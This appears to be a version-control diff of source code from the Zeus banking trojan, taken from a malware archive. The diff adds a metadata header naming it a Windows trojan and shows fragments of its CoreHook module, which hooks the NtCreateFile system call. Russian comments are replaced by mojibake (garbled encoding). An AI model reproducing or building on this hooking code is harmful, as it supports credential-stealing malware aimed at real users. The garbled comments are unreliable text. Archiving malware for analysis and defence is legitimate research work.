@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wininet.h>
 
@@ -60,7 +71,7 @@ void CoreHook::disableFileHookerForCurrentThread(bool disable)
 }
 
 /*
-  Получение текущих флагов для дочерного потока, и его сброс.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   
   Return - Core::CDPF_*.
 */
@@ -310,7 +321,7 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateFile(PHANDLE fileHandle, ACCESS_MASK desi
      (createOptions & (FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_DELETE_ON_CLOSE | FILE_OPEN_BY_FILE_ID)) == 0 && //Other bad signs.
 
      objectAttributes != NULL && objectAttributes->Length >= sizeof(OBJECT_ATTRIBUTES) && objectAttributes->ObjectName != NULL &&
-     objectAttributes->ObjectName->Buffer != NULL && objectAttributes->ObjectName->Length > 4 * sizeof(WCHAR) && (objectAttributes->ObjectName->Length % sizeof(WCHAR)) == 0 && /*параноя*/
+     objectAttributes->ObjectName->Buffer != NULL && objectAttributes->ObjectName->Length > 4 * sizeof(WCHAR) && (objectAttributes->ObjectName->Length % sizeof(WCHAR)) == 0 && /*пїЅпїЅпїЅпїЅпїЅпїЅпїЅ*/
 
      ntCreateFileTlsIndex != TLS_OUT_OF_INDEXES && CWA(kernel32, TlsGetValue)(ntCreateFileTlsIndex) == (void *)0 &&          //Protection from rekrussii.
 
